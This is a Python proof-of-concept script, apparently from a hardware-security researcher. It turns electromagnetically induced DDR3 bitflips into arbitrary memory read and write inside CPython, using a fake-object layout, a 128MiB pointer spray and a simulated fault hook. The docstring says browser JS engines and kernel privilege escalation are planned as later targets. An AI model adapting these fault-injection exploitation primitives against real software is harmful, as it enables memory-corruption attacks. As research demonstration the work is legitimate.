"""
Hardware setup:

Laptop with a single 1GB DDR3 SODIMM, with a ~10CM "antenna" wire soldered to the DQ7 line

When I click the button on a regular piezo-electric cigarette lighter, a small EMP
is generated, which is picked up by the antenna. Running memtest shows several
bitflips occur each time (depending on the distance) and the flip *always* affects
bit 7 of each 64-bit word.

The idea:

I'm "exploiting" cpython first as a PoC because I'm familiar with cpython's inner workings.
Obviously it's a bit pointless because you can just os.system("/bin/sh"), but this exploit
should demonstrate practical exploitation of physically induced memory corruptions.

Once I have this working, I'm going to look into exploiting browser JS engines, and also kernel LPEs.

We can use similar strategies to rowhammer exploits, but rather than the bitflips
occuring in memory contents "at rest", theu're occuring "in flight" over the bus.
"""

def p64(n: int) -> bytes:
	return n.to_bytes(8, "little")

def prepare_bytes(writer: bytearray, padding: int) -> bytes:
	# correct layout as of python3.12
	fake_bytearray = b""
	fake_bytearray += p64(1) # refcount
	fake_bytearray += p64(id(bytearray)) # type
	fake_bytearray += p64(1024) # length?
	fake_bytearray += p64(1024+1) # length2?
	fake_bytearray += p64(id(writer)) # ptr?
	fake_bytearray += p64(id(writer)) # ptr2?
	fake_bytearray += p64(0) # ????
	fake_bytearray += p64(0) # ????
	fake_bytearray += p64(0) # ????
	fake_bytearray += p64(0) # ????

	# Set up a bytes object that contains a bytearray object within it, at offset 0x80.
	victim = b"A"*(0x80 - 32) + fake_bytearray + b"A"*padding # bytes objects have 32 bytes of header (on 64-bit systems), immediately followed by their value

	return victim

if __name__ == "__main__":
	TESTING = True
	if TESTING:
		from simulate_ddr3_dq7_fault import simulate_emfi

	writer = bytearray(8) # we'll later turn this into an arbread/arbwrite primitive

	for i in range(0, 0x10000, 0x80):
		victim = prepare_bytes(writer, i)
		victim_addr = id(victim)
		if victim_addr & 0x80 == 0: # this ensures that when bit 7 flips, it has the effect of adding 128 to the address
			break
		# keep trying until that constraint is met
	else:
		raise Exception("failed to align victim object")

	print("victim object @", hex(victim_addr))

	print("Spraying...")
	magic = None
	while not magic:
		spray = (victim,) * 0x100_0000 # spray 128MiB worth of pointers (needs to be big enough to exceed L3 cache)
		if TESTING:
			simulate_emfi() # in practice this corrupts data "at rest", but imagine we're corrupting either the writes (during the spray) or the reads (in the loop that follows)
		for obj in spray:
			if obj is not victim:
				print("It worked!")
				print("corrupted addr:", hex(id(obj)))
				assert(type(obj) is bytearray)
				magic = obj
				break
		print(".", end="", flush=True) # progress kinda

	print("\nSpray success! Found corrupted victim object ptr")

	def read64(addr: int) -> bytes:
		magic[8*4:8*5] = p64(addr)
		magic[8*5:8*6] = p64(addr)
		#return int.from_bytes(writer, "little")
		return bytes(writer)
	
	def write64(addr: int, value) -> None:
		if type(value) is int:
			value = p64(value)
		magic[8*4:8*5] = p64(addr)
		magic[8*5:8*6] = p64(addr)
		writer[:8] = value

	hello = b"hello"

	print(read64(id(hello)+32)) # sanity check

	# use arbwrite to modify the "hello" variable
	write64(id(hello)+32, b"xxxxx\0\0\0")

	# print the modified version
	print(hello)
